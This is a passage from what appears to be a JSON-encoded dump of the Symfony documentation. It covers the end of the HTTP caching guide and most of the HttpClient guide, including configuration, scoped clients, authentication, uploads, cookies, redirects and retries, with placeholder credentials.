Requests`_.\n\n    As a web developer, you are strongly urged to read the specification. Its\n    clarity and power - even more than fifteen years after its creation - is\n    invaluable. Don't be put-off by the appearance of the spec - its contents\n    are much more beautiful than its cover!\n\n.. _http-cache-expiration-intro:\n\nExpiration Caching\n~~~~~~~~~~~~~~~~~~\n\nThe *easiest* way to cache a response is by caching it for a specific amount of time::\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        use Symfony\\Component\\HttpKernel\\Attribute\\Cache;\n        // ...\n\n        #[Cache(public: true, maxage: 3600, mustRevalidate: true)]\n        public function index(): Response\n        {\n            return $this->render('blog/index.html.twig', []);\n        }\n\n    .. code-block:: php\n\n        // src/Controller/BlogController.php\n        use Symfony\\Component\\HttpFoundation\\Response;\n\n        public function index(): Response\n        {\n            // somehow create a Response object, like by rendering a template\n            $response = $this->render('blog/index.html.twig', []);\n\n            // cache publicly for 3600 seconds\n            $response->setPublic();\n            $response->setMaxAge(3600);\n\n            // (optional) set a custom Cache-Control directive\n            $response->headers->addCacheControlDirective('must-revalidate', true);\n\n            return $response;\n        }\n\nThanks to this new code, your HTTP response will have the following header:\n\n.. code-block:: text\n\n    Cache-Control: public, maxage=3600, must-revalidate\n\nThis tells your HTTP reverse proxy to cache this response for 3600 seconds. If *anyone*\nrequests this URL again before 3600 seconds, your application *won't* be hit at all.\nIf you're using the Symfony reverse proxy, look at the ``X-Symfony-Cache`` header\nfor debugging information about cache hits and misses.\n\n.. tip::\n\n    The URI of the request is used as the cache key (unless you :doc:`vary </http_cache/cache_vary>`).\n\nThis provides great performance and is simple to use. But, cache *invalidation*\nis not supported. If your content change, you'll need to wait until your cache\nexpires for the page to update.\n\n.. tip::\n\n    Actually, you *can* manually invalidate your cache, but it's not part of the\n    HTTP Caching spec. See :ref:`http-cache-invalidation`.\n\nIf you need to set cache headers for many different controller actions, check out\n`FOSHttpCacheBundle`_. It provides a way to define cache headers based on the URL\npattern and other request properties.\n\nFinally, for more information about expiration caching, see :doc:`/http_cache/expiration`.\n\n.. _http-cache-validation-intro:\n\nValidation Caching\n~~~~~~~~~~~~~~~~~~\n\nWith expiration caching, you say \"cache for 3600 seconds!\". But, when someone\nupdates cached content, you won't see that content on your site until the cache\nexpires.\n\nIf you need to see updated content *immediately*, you either need to\n:ref:`invalidate <http-cache-invalidation>` your cache *or* use the validation\ncaching model.\n\nFor details, see :doc:`/http_cache/validation`.\n\nSafe Methods: Only caching GET or HEAD requests\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nHTTP caching only works for \"safe\" HTTP methods (like GET and HEAD). This means\nthree things:\n\n* Don't try to cache PUT or DELETE requests. It won't work and with good reason.\n  These methods are meant to be used when mutating the state of your application\n  (e.g. deleting a blog post). Caching them would prevent certain requests from hitting\n  and mutating your application.\n\n* POST requests are generally considered uncacheable, but `they can be cached`_\n  when they include explicit freshness information. However, POST caching is not\n  widely implemented, so you should avoid it if possible.\n\n* You should *never* change the state of your application (e.g. update a blog post)\n  when responding to a GET or HEAD request. If those requests are cached, future\n  requests may not actually hit your server.\n\nMore Response Methods\n~~~~~~~~~~~~~~~~~~~~~\n\nThe Response class provides many more methods related to the cache. Here are\nthe most useful ones::\n\n    // marks the Response stale\n    $response->expire();\n\n    // forces the response to return a proper 304 response with no content\n    $response->setNotModified();\n\nAdditionally, most cache-related HTTP headers can be set via the single\n:method:`Symfony\\\\Component\\\\HttpFoundation\\\\Response::setCache` method::\n\n    // use this method to set several cache settings in one call\n    // (this example lists all the available cache settings)\n    $response->setCache([\n        'must_revalidate'  => false,\n        'no_cache'         => false,\n        'no_store'         => false,\n        'no_transform'     => false,\n        'public'           => true,\n        'private'          => false,\n        'proxy_revalidate' => false,\n        'max_age'          => 600,\n        's_maxage'         => 600,\n        'immutable'        => true,\n        'last_modified'    => new \\DateTime(),\n        'etag'             => 'abcdef'\n    ]);\n\n.. tip::\n\n    All these options are also available when using the ``#[Cache]`` attribute.\n\nCache Invalidation\n------------------\n\nCache invalidation is *not* part of the HTTP specification. Still, it can be really\nuseful to delete various HTTP cache entries as soon as some content on your site\nis updated.\n\nFor details, see :doc:`/http_cache/cache_invalidation`.\n\nUsing Edge Side Includes\n------------------------\n\nWhen pages contain dynamic parts, you may not be able to cache entire pages,\nbut only parts of it. Read :doc:`/http_cache/esi` to find out how to configure\ndifferent cache strategies for specific parts of your page.\n\nHTTP Caching and User Sessions\n------------------------------\n\nWhenever the session is started during a request, Symfony turns the response\ninto a private non-cacheable response. This is the best default behavior to not\ncache private user information (e.g. a shopping cart, a user profile details,\netc.) and expose it to other visitors.\n\nHowever, even requests making use of the session can be cached under some\ncircumstances. For example, information related to some user group could be\ncached for all the users belonging to that group. Handling these advanced\ncaching scenarios is out of the scope of Symfony, but they can be solved with\nthe `FOSHttpCacheBundle`_.\n\nIn order to disable the default Symfony behavior that makes requests using the\nsession uncacheable, add the following internal header to your response and\nSymfony won't modify it::\n\n    use Symfony\\Component\\HttpKernel\\EventListener\\AbstractSessionListener;\n\n    $response->headers->set(AbstractSessionListener::NO_AUTO_CACHE_CONTROL_HEADER, 'true');\n\nSummary\n-------\n\nSymfony was designed to follow the proven rules of the road: HTTP. Caching\nis no exception. Mastering the Symfony cache system means becoming familiar\nwith the HTTP cache models and using them effectively. This means that, instead\nof relying only on Symfony documentation and code examples, you have access\nto a world of knowledge related to HTTP caching and gateway caches such as\nVarnish.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    http_cache/*\n\n.. _`Things Caches Do`: https://tomayko.com/blog/2008/things-caches-do\n.. _`Cache Tutorial`: https://www.mnot.net/cache_docs/\n.. _`Varnish`: https://varnish-cache.org/\n.. _`Squid in reverse proxy mode`: https://wiki.squid-cache.org/SquidFaq/ReverseProxy\n.. _`RFC 7234 - Caching`: https://tools.ietf.org/html/rfc7234\n.. _`RFC 7232 - Conditional Requests`: https://tools.ietf.org/html/rfc7232\n.. _`FOSHttpCacheBundle`: https://foshttpcachebundle.readthedocs.org/\n.. _`they can be cached`: https://tools.ietf.org/html/draft-ietf-httpbis-p2-semantics-20#section-2.3.4\n"
        },
        {
          "name": "http_cache",
          "type": "tree",
          "content": null
        },
        {
          "name": "http_client.rst",
          "type": "blob",
          "size": 92.0634765625,
          "content": "HTTP Client\n===========\n\nInstallation\n------------\n\nThe HttpClient component is a low-level HTTP client with support for both\nPHP stream wrappers and cURL. It provides utilities to consume APIs and\nsupports synchronous and asynchronous operations. You can install it with:\n\n.. code-block:: terminal\n\n    $ composer require symfony/http-client\n\nBasic Usage\n-----------\n\nUse the :class:`Symfony\\\\Component\\\\HttpClient\\\\HttpClient` class to make\nrequests. In the Symfony framework, this class is available as the\n``http_client`` service. This service will be :doc:`autowired </service_container/autowiring>`\nautomatically when type-hinting for :class:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface`:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use Symfony\\Contracts\\HttpClient\\HttpClientInterface;\n\n        class SymfonyDocs\n        {\n            public function __construct(\n                private HttpClientInterface $client,\n            ) {\n            }\n\n            public function fetchGitHubInformation(): array\n            {\n                $response = $this->client->request(\n                    'GET',\n                    'https://api.github.com/repos/symfony/symfony-docs'\n                );\n\n                $statusCode = $response->getStatusCode();\n                // $statusCode = 200\n                $contentType = $response->getHeaders()['content-type'][0];\n                // $contentType = 'application/json'\n                $content = $response->getContent();\n                // $content = '{\"id\":521583, \"name\":\"symfony-docs\", ...}'\n                $content = $response->toArray();\n                // $content = ['id' => 521583, 'name' => 'symfony-docs', ...]\n\n                return $content;\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpClient\\HttpClient;\n\n        $client = HttpClient::create();\n        $response = $client->request(\n            'GET',\n            'https://api.github.com/repos/symfony/symfony-docs'\n        );\n\n        $statusCode = $response->getStatusCode();\n        // $statusCode = 200\n        $contentType = $response->getHeaders()['content-type'][0];\n        // $contentType = 'application/json'\n        $content = $response->getContent();\n        // $content = '{\"id\":521583, \"name\":\"symfony-docs\", ...}'\n        $content = $response->toArray();\n        // $content = ['id' => 521583, 'name' => 'symfony-docs', ...]\n\n.. tip::\n\n    The HTTP client is interoperable with many common HTTP client abstractions in\n    PHP. You can also use any of these abstractions to profit from autowirings.\n    See `Interoperability`_ for more information.\n\nConfiguration\n-------------\n\nThe HTTP client contains many options you might need to take full control of\nthe way the request is performed, including DNS pre-resolution, SSL parameters,\npublic key pinning, etc. They can be defined globally in the configuration (to\napply it to all requests) and to each request (which overrides any global\nconfiguration).\n\nYou can configure the global options using the ``default_options`` option:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                default_options:\n                    max_redirects: 7\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <framework:default-options max-redirects=\"7\"/>\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()\n                ->defaultOptions()\n                    ->maxRedirects(7)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        $client = HttpClient::create([\n             'max_redirects' => 7,\n        ]);\n\nYou can also use the :method:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface::withOptions`\nmethod to retrieve a new instance of the client with new default options::\n\n    $this->client = $client->withOptions([\n        'base_uri' => 'https://...',\n        'headers' => ['header-name' => 'header-value'],\n        'extra' => ['my-key' => 'my-value'],\n    ]);\n\nAlternatively, the :class:`Symfony\\\\Component\\\\HttpClient\\\\HttpOptions` class\nbrings most of the available options with type-hinted getters and setters::\n\n    $this->client = $client->withOptions(\n        (new HttpOptions())\n            ->setBaseUri('https://...')\n            // replaces *all* headers at once, and deletes the headers you do not provide\n            ->setHeaders(['header-name' => 'header-value'])\n            // set or replace a single header using setHeader()\n            ->setHeader('another-header-name', 'another-header-value')\n            ->toArray()\n    );\n\n.. versionadded:: 7.1\n\n    The :method:`Symfony\\\\Component\\\\HttpClient\\\\HttpOptions::setHeader`\n    method was introduced in Symfony 7.1.\n\nSome options are described in this guide:\n\n* `Authentication`_\n* `Query String Parameters`_\n* `Headers`_\n* `Redirects`_\n* `Retry Failed Requests`_\n* `HTTP Proxies`_\n* `Using URI Templates`_\n\nCheck out the full :ref:`http_client config reference <reference-http-client>`\nto learn about all the options.\n\nThe HTTP client also has one configuration option called\n``max_host_connections``, this option can not be overridden by a request:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                max_host_connections: 10\n                # ...\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client max-host-connections=\"10\">\n                    <!-- ... -->\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()\n                ->maxHostConnections(10)\n                // ...\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        $client = HttpClient::create([], 10);\n\nScoping Client\n~~~~~~~~~~~~~~\n\nIt's common that some of the HTTP client options depend on the URL of the\nrequest (e.g. you must set some headers when making requests to GitHub API but\nnot for other hosts). If that's your case, the component provides scoped\nclients (using :class:`Symfony\\\\Component\\\\HttpClient\\\\ScopingHttpClient`) to\nautoconfigure the HTTP client based on the requested URL:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                scoped_clients:\n                    # only requests matching scope will use these options\n                    github.client:\n                        scope: 'https://api\\.github\\.com'\n                        headers:\n                            Accept: 'application/vnd.github.v3+json'\n                            Authorization: 'token %env(GITHUB_API_TOKEN)%'\n                        # ...\n\n                    # using base_uri, relative URLs (e.g. request(\"GET\", \"/repos/symfony/symfony-docs\"))\n                    # will default to these options\n                    github.client:\n                        base_uri: 'https://api.github.com'\n                        headers:\n                            Accept: 'application/vnd.github.v3+json'\n                            Authorization: 'token %env(GITHUB_API_TOKEN)%'\n                        # ...\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <!-- only requests matching scope will use these options -->\n                    <framework:scoped-client name=\"github.client\"\n                        scope=\"https://api\\.github\\.com\"\n                    >\n                        <framework:header name=\"Accept\">application/vnd.github.v3+json</framework:header>\n                        <framework:header name=\"Authorization\">token %env(GITHUB_API_TOKEN)%</framework:header>\n                    </framework:scoped-client>\n\n                    <!-- using base-uri, relative URLs (e.g. request(\"GET\", \"/repos/symfony/symfony-docs\"))\n                         will default to these options -->\n                    <framework:scoped-client name=\"github.client\"\n                        base-uri=\"https://api.github.com\"\n                    >\n                        <framework:header name=\"Accept\">application/vnd.github.v3+json</framework:header>\n                        <framework:header name=\"Authorization\">token %env(GITHUB_API_TOKEN)%</framework:header>\n                    </framework:scoped-client>\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // only requests matching scope will use these options\n            $framework->httpClient()->scopedClient('github.client')\n                ->scope('https://api\\.github\\.com')\n                ->header('Accept', 'application/vnd.github.v3+json')\n                ->header('Authorization', 'token %env(GITHUB_API_TOKEN)%')\n                // ...\n            ;\n\n            // using base_url, relative URLs (e.g. request(\"GET\", \"/repos/symfony/symfony-docs\"))\n            // will default to these options\n            $framework->httpClient()->scopedClient('github.client')\n                ->baseUri('https://api.github.com')\n                ->header('Accept', 'application/vnd.github.v3+json')\n                ->header('Authorization', 'token %env(GITHUB_API_TOKEN)%')\n                // ...\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpClient\\HttpClient;\n        use Symfony\\Component\\HttpClient\\ScopingHttpClient;\n\n        $client = HttpClient::create();\n        $client = new ScopingHttpClient($client, [\n            // the options defined as values apply only to the URLs matching\n            // the regular expressions defined as keys\n            'https://api\\.github\\.com/' => [\n                'headers' => [\n                    'Accept' => 'application/vnd.github.v3+json',\n                    'Authorization' => 'token '.$githubToken,\n                ],\n            ],\n            // ...\n        ]);\n\n        // relative URLs will use the 2nd argument as base URI and use the options of the 3rd argument\n        $client = ScopingHttpClient::forBaseUri($client, 'https://api.github.com/', [\n            'headers' => [\n                'Accept' => 'application/vnd.github.v3+json',\n                'Authorization' => 'token '.$githubToken,\n            ],\n        ]);\n\nYou can define several scopes, so that each set of options is added only if a\nrequested URL matches one of the regular expressions set by the ``scope`` option.\n\nIf you use scoped clients in the Symfony framework, you must use any of the\nmethods defined by Symfony to :ref:`choose a specific service <services-wire-specific-service>`.\nEach client has a unique service named after its configuration.\n\nEach scoped client also defines a corresponding named autowiring alias.\nIf you use for example\n``Symfony\\Contracts\\HttpClient\\HttpClientInterface $githubClient``\nas the type and name of an argument, autowiring will inject the ``github.client``\nservice into your autowired classes.\n\n.. note::\n\n    Read the :ref:`base_uri option docs <reference-http-client-base-uri>` to\n    learn the rules applied when merging relative URIs into the base URI of the\n    scoped client.\n\nMaking Requests\n---------------\n\nThe HTTP client provides a single ``request()`` method to perform all kinds of\nHTTP requests::\n\n    $response = $client->request('GET', 'https://...');\n    $response = $client->request('POST', 'https://...');\n    $response = $client->request('PUT', 'https://...');\n    // ...\n\n    // you can add request options (or override global ones) using the 3rd argument\n    $response = $client->request('GET', 'https://...', [\n        'headers' => [\n            'Accept' => 'application/json',\n        ],\n    ]);\n\nResponses are always asynchronous, so that the call to the method returns\nimmediately instead of waiting to receive the response::\n\n    // code execution continues immediately; it doesn't wait to receive the response\n    $response = $client->request('GET', 'http://releases.ubuntu.com/18.04.2/ubuntu-18.04.2-desktop-amd64.iso');\n\n    // getting the response headers waits until they arrive\n    $contentType = $response->getHeaders()['content-type'][0];\n\n    // trying to get the response content will block the execution until\n    // the full response content is received\n    $content = $response->getContent();\n\nThis component also supports :ref:`streaming responses <http-client-streaming-responses>`\nfor full asynchronous applications.\n\nAuthentication\n~~~~~~~~~~~~~~\n\nThe HTTP client supports different authentication mechanisms. They can be\ndefined globally in the configuration (to apply it to all requests) and to\neach request (which overrides any global authentication):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                scoped_clients:\n                    example_api:\n                        base_uri: 'https://example.com/'\n\n                        # HTTP Basic authentication\n                        auth_basic: 'the-username:the-password'\n\n                        # HTTP Bearer authentication (also called token authentication)\n                        auth_bearer: the-bearer-token\n\n                        # Microsoft NTLM authentication\n                        auth_ntlm: 'the-username:the-password'\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <!-- Available authentication options:\n                         auth-basic: HTTP Basic authentication\n                         auth-bearer: HTTP Bearer authentication (also called token authentication)\n                         auth-ntlm: Microsoft NTLM authentication -->\n                    <framework:scoped-client name=\"example_api\"\n                        base-uri=\"https://example.com/\"\n                        auth-basic=\"the-username:the-password\"\n                        auth-bearer=\"the-bearer-token\"\n                        auth-ntlm=\"the-username:the-password\"\n                    />\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()->scopedClient('example_api')\n                ->baseUri('https://example.com/')\n                // HTTP Basic authentication\n                ->authBasic('the-username:the-password')\n\n                // HTTP Bearer authentication (also called token authentication)\n                ->authBearer('the-bearer-token')\n\n                // Microsoft NTLM authentication\n                ->authNtlm('the-username:the-password')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        $client = HttpClient::createForBaseUri('https://example.com/', [\n            // HTTP Basic authentication (there are multiple ways of configuring it)\n            'auth_basic' => ['the-username'],\n            'auth_basic' => ['the-username', 'the-password'],\n            'auth_basic' => 'the-username:the-password',\n\n            // HTTP Bearer authentication (also called token authentication)\n            'auth_bearer' => 'the-bearer-token',\n\n            // Microsoft NTLM authentication (there are multiple ways of configuring it)\n            'auth_ntlm' => ['the-username'],\n            'auth_ntlm' => ['the-username', 'the-password'],\n            'auth_ntlm' => 'the-username:the-password',\n        ]);\n\n.. code-block:: php\n\n    $response = $client->request('GET', 'https://...', [\n        // use a different HTTP Basic authentication only for this request\n        'auth_basic' => ['the-username', 'the-password'],\n\n        // ...\n    ]);\n\n.. note::\n\n    Basic Authentication can also be set by including the credentials in the URL,\n    such as: ``http://the-username:the-password@example.com``\n\n.. note::\n\n    The NTLM authentication mechanism requires using the cURL transport.\n    By using ``HttpClient::createForBaseUri()``, we ensure that the auth credentials\n    won't be sent to any other hosts than https://example.com/.\n\nQuery String Parameters\n~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can either append them manually to the requested URL, or define them as an\nassociative array via the ``query`` option, that will be merged with the URL::\n\n    // it makes an HTTP GET request to https://httpbin.org/get?token=...&name=...\n    $response = $client->request('GET', 'https://httpbin.org/get', [\n        // these values are automatically encoded before including them in the URL\n        'query' => [\n            'token' => '...',\n            'name' => '...',\n        ],\n    ]);\n\nHeaders\n~~~~~~~\n\nUse the ``headers`` option to define the default headers added to all requests:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                default_options:\n                    headers:\n                        'User-Agent': 'My Fancy App'\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <framework:default-options>\n                        <framework:header name=\"User-Agent\">My Fancy App</framework:header>\n                    </framework:default-options>\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()\n                ->defaultOptions()\n                    ->header('User-Agent', 'My Fancy App')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        // this header is added to all requests made by this client\n        $client = HttpClient::create([\n            'headers' => [\n                'User-Agent' => 'My Fancy App',\n            ],\n        ]);\n\nYou can also set new headers or override the default ones for specific requests::\n\n    // this header is only included in this request and overrides the value\n    // of the same header if defined globally by the HTTP client\n    $response = $client->request('POST', 'https://...', [\n        'headers' => [\n            'Content-Type' => 'text/plain',\n        ],\n    ]);\n\nUploading Data\n~~~~~~~~~~~~~~\n\nThis component provides several methods for uploading data using the ``body``\noption. You can use regular strings, closures, iterables and resources and they'll be\nprocessed automatically when making the requests::\n\n    $response = $client->request('POST', 'https://...', [\n        // defining data using a regular string\n        'body' => 'raw data',\n\n        // defining data using an array of parameters\n        'body' => ['parameter1' => 'value1', '...'],\n\n        // using a closure to generate the uploaded data\n        'body' => function (int $size): string {\n            // ...\n        },\n\n        // using a resource to get the data from it\n        'body' => fopen('/path/to/file', 'r'),\n    ]);\n\nWhen uploading data with the ``POST`` method, if you don't define the\n``Content-Type`` HTTP header explicitly, Symfony assumes that you're uploading\nform data and adds the required\n``'Content-Type: application/x-www-form-urlencoded'`` header for you.\n\nWhen the ``body`` option is set as a closure, it will be called several times until\nit returns the empty string, which signals the end of the body. Each time, the\nclosure should return a string smaller than the amount requested as argument.\n\nA generator or any ``Traversable`` can also be used instead of a closure.\n\n.. tip::\n\n    When uploading JSON payloads, use the ``json`` option instead of ``body``. The\n    given content will be JSON-encoded automatically and the request will add the\n    ``Content-Type: application/json`` automatically too::\n\n        $response = $client->request('POST', 'https://...', [\n            'json' => ['param1' => 'value1', '...'],\n        ]);\n\n        $decodedPayload = $response->toArray();\n\nTo submit a form with file uploads, pass the file handle to the ``body`` option::\n\n    $fileHandle = fopen('/path/to/the/file', 'r');\n    $client->request('POST', 'https://...', ['body' => ['the_file' => $fileHandle]]);\n\nBy default, this code will populate the filename and content-type with the data\nof the opened file, but you can configure both with the PHP streaming configuration::\n\n    stream_context_set_option($fileHandle, 'http', 'filename', 'the-name.txt');\n    stream_context_set_option($fileHandle, 'http', 'content_type', 'my/content-type');\n\n.. tip::\n\n    When using multidimensional arrays the :class:`Symfony\\\\Component\\\\Mime\\\\Part\\\\Multipart\\\\FormDataPart`\n    class automatically appends ``[key]`` to the name of the field::\n\n        $formData = new FormDataPart([\n            'array_field' => [\n                'some value',\n                'other value',\n            ],\n        ]);\n\n        $formData->getParts(); // Returns two instances of TextPart\n                               // with the names \"array_field[0]\" and \"array_field[1]\"\n\n    This behavior can be bypassed by using the following array structure::\n\n        $formData = new FormDataPart([\n            ['array_field' => 'some value'],\n            ['array_field' => 'other value'],\n        ]);\n\n        $formData->getParts(); // Returns two instances of TextPart both\n                               // with the name \"array_field\"\n\nBy default, HttpClient streams the body contents when uploading them. This might\nnot work with all servers, resulting in HTTP status code 411 (\"Length Required\")\nbecause there is no ``Content-Length`` header. The solution is to turn the body\ninto a string with the following method (which will increase memory consumption\nwhen the streams are large)::\n\n    $client->request('POST', 'https://...', [\n        // ...\n        'body' => $formData->bodyToString(),\n        'headers' => $formData->getPreparedHeaders()->toArray(),\n    ]);\n\nIf you need to add a custom HTTP header to the upload, you can do::\n\n    $headers = $formData->getPreparedHeaders()->toArray();\n    $headers[] = 'X-Foo: bar';\n\nCookies\n~~~~~~~\n\nThe HTTP client provided by this component is stateless but handling cookies\nrequires a stateful storage (because responses can update cookies and they must\nbe used for subsequent requests). That's why this component doesn't handle\ncookies automatically.\n\nYou can either :ref:`send cookies with the BrowserKit component <component-browserkit-sending-cookies>`,\nwhich integrates seamlessly with the HttpClient component, or manually setting\n`the Cookie HTTP request header`_ as follows::\n\n    use Symfony\\Component\\HttpClient\\HttpClient;\n    use Symfony\\Component\\HttpFoundation\\Cookie;\n\n    $client = HttpClient::create([\n        'headers' => [\n            // set one cookie as a name=value pair\n            'Cookie' => 'flavor=chocolate',\n\n            // you can set multiple cookies at once separating them with a ;\n            'Cookie' => 'flavor=chocolate; size=medium',\n\n            // if needed, encode the cookie value to ensure that it contains valid characters\n            'Cookie' => sprintf(\"%s=%s\", 'foo', rawurlencode('...')),\n        ],\n    ]);\n\nRedirects\n~~~~~~~~~\n\nBy default, the HTTP client follows redirects, up to a maximum of 20, when\nmaking a request. Use the ``max_redirects`` setting to configure this behavior\n(if the number of redirects is higher than the configured value, you'll get a\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Exception\\\\RedirectionException`)::\n\n    $response = $client->request('GET', 'https://...', [\n        // 0 means to not follow any redirect\n        'max_redirects' => 0,\n    ]);\n\nRetry Failed Requests\n~~~~~~~~~~~~~~~~~~~~~\n\nSometimes, requests fail because of network issues or temporary server errors.\nSymfony's HttpClient allows to retry failed requests automatically using the\n:ref:`retry_failed option <reference-http-client-retry-failed>`.\n\nBy default, failed requests are retried up to 3 times, with an exponential delay\nbetween retries (first retry = 1 second; third retry: 4 seconds) and only for\nthe following HTTP status codes: ``423``, ``425``, ``429``, ``502`` and ``503``\nwhen using any HTTP method and ``500``, ``504``, ``507`` and ``510`` when using\nan HTTP `idempotent method`_. Use the ``max_retries`` setting to configure the\namount of times a request is retried.\n\nCheck out the full list of configurable :ref:`retry_failed options <reference-http-client-retry-failed>`\nto learn how to tweak each of them to fit your application needs.\n\nWhen using the HttpClient outside of a Symfony application, use the\n:class:`Symfony\\\\Component\\\\HttpClient\\\\RetryableHttpClient` class to wrap your\noriginal HTTP client::\n\n    use Symfony\\Component\\HttpClient\\RetryableHttpClient;\n\n    $client = new RetryableHttpClient(HttpClient::create());\n\nThe :class:`Symfony\\\\Component\\\\HttpClient\\\\RetryableHttpClient` uses a\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Retry\\\\RetryStrategyInterface` to\ndecide if the request should be retried, and to define the waiting time between\neach retry.\n\nRetry Over Several Base URIs\n............................\n\nThe ``RetryableHttpClient`` can be configured to use multiple base URIs. This\nfeature provides increased flexibility and reliability for making HTTP\nrequests. Pass an array of base URIs as option ``base_uri`` when making a\nrequest::\n\n    $response = $client->request('GET', 'some-page', [\n        'base_uri' => [\n            // first request will use this base URI\n            'https://example.com/a/',\n            // if first request fails, the following base URI will be used\n            'https://example.com/b/',\n        ],\n    ]);\n\nWhen the number of retries is higher than the number of base URIs, the\nlast base URI will be used for the remaining retries.\n\nIf you want to shuffle the order of base URIs for each retry attempt, nest the\nbase URIs you want to shuffle in an additional array::\n\n    $response = $client->request('GET', 'some-page', [\n        'base_uri' => [\n            [\n                // a single random URI from this array will be used for the first request\n                'https://example.com/a/',\n                'https://example.com/b/',\n            ],\n            // non-nested base URIs are used in order\n            'https://example.com/c/',\n        ],\n    ]);\n\nThis feature allows for a more randomized approach to handling retries,\nreducing the likelihood of repeatedly hitting the same failed base URI.\n\nBy using a nested array for the base URI, you can use this feature\nto distribute the load among many nodes in a cluster of servers.\n\nYou can also configure the array of base URIs using the ``withOptions()``\nmethod::\n\n    $client = $client->withOptions(['base_uri' => [\n        'https://example.com/a/',\n        'https://example.com/b/',\n    ]]);\n\nHTTP Proxies\n~~~~~~~~~~~~\n\nBy default, this component honors the standard environment variables that your\nOperating System defines to direct the HTTP traffic through your local proxy.\nThis means there is usually 